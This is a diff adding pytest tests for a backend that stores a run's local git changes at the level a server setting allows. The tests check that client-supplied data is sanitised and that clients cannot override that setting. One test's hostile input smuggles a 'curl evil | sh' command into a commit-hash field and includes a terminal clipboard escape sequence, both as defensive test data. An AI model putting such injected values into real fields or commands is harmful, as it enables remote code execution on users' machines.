@@ -46,7 +46,10 @@ def post(outputs_api, dummy_app, without=(), **data):
 
 
 def notify(outputs_api, dummy_app, **data):
-  return post(outputs_api, dummy_app, **data).get_json()
+  """The run, as the server answers it (without what it says about its settings)"""
+  answer = post(outputs_api, dummy_app, **data).get_json()
+  answer.pop('local_changes_level', None)
+  return answer
 
 
 @pytest.mark.parametrize("status", [{"is_pending": True}, {"is_pending": True, "is_running": True}])
@@ -515,3 +518,51 @@ def test_progress_needs_access_to_the_project(outputs_api, dummy_app, running_ru
   outputs_api.Output.query.filter.return_value.one.side_effect = outputs_api.NoResultFound
   _, status = report_progress(outputs_api, dummy_app, {"metrics": {"x": 1}})
   assert status == 404
+
+
+LOCAL_CHANGES = {
+  "level": "patch", "dirty": True, "head": "0" * 40, "files": [{"path": "a.py", "status": "M", "added": 1, "deleted": 0}],
+  "files_total": 1, "added": 1, "deleted": 0, "sha256": "f" * 64, "patch": {"path": ".qaboard/local-changes.patch", "bytes": 10},
+}
+
+
+@pytest.mark.parametrize("level, expected", [
+  ("patch", LOCAL_CHANGES),
+  ("summary", {**{k: v for k, v in LOCAL_CHANGES.items() if k != "patch"}, "level": "summary", "patch": {"bytes": 10, "omitted": "level"}}),
+  ("off", None),
+])
+def test_runs_record_as_much_of_their_local_changes_as_allowed(outputs_api, dummy_app, monkeypatch, level, expected):
+  from backend import local_changes
+  monkeypatch.setattr(local_changes, "setting", lambda key: level if key == "runs.local_changes" else None)
+  answer = post(outputs_api, dummy_app, data={"local_changes": LOCAL_CHANGES, "dirty": True}).get_json()
+  # runs that write in a shared storage don't write patches the server doesn't want
+  assert answer["local_changes_level"] == level
+  assert outputs_api.test_output.data.get("local_changes") == expected
+  assert outputs_api.test_output.data.get("dirty") is (None if level == "off" else True)
+
+
+def test_local_changes_are_kept_as_the_web_app_expects_them(outputs_api, dummy_app):
+  hostile = {**LOCAL_CHANGES, "files": [{"path": "x" * 10_000, "added": "1", "status": "Mxx"}, "a.py", {"path": 3}] + [{"path": "b"}] * 600,
+             "excluded": "nope", "code": "print('hi')", "dirty": "yes", "branch": ["main"], "head": "x; curl evil | sh #", "base": "a" * 40,
+             "error": "\x1b]52;c;ZXZpbA==\x07bad"}
+  post(outputs_api, dummy_app, data={"local_changes": hostile, "dirty": "yes"})
+  kept = outputs_api.test_output.data["local_changes"]
+  assert len(kept["files"]) == 498 and kept["files"][0] == {"path": "x" * 4096, "status": "Mx", "added": None, "deleted": None}
+  assert "code" not in kept and "excluded" not in kept and "branch" not in kept
+  # commits are shas: people copy commands made of them
+  assert "head" not in kept and kept["base"] == "a" * 40
+  assert kept["error"] == "]52;c;ZXZpbA==bad"
+  assert kept["dirty"] is None and outputs_api.test_output.data["dirty"] is None
+
+
+def test_unpushed_commits_are_listed_by_sha_and_subject(outputs_api, dummy_app):
+  log = [{"sha": "c" * 40, "subject": "Tune the filter"}, {"sha": "HEAD", "subject": "x"}, "nope"]
+  post(outputs_api, dummy_app, data={"local_changes": {**LOCAL_CHANGES, "unpushed_log": log}})
+  assert outputs_api.test_output.data["local_changes"]["unpushed_log"] == [{"sha": "c" * 40, "subject": "Tune the filter"}]
+
+
+def test_clients_cant_say_their_patch_is_allowed(outputs_api, dummy_app, monkeypatch):
+  from backend import local_changes
+  monkeypatch.setattr(local_changes, "setting", lambda key: "summary" if key == "runs.local_changes" else None)
+  post(outputs_api, dummy_app, data={"local_changes": {**LOCAL_CHANGES, "level": "off"}})
+  assert outputs_api.test_output.data["local_changes"]["patch"] == {"bytes": 10, "omitted": "level"}
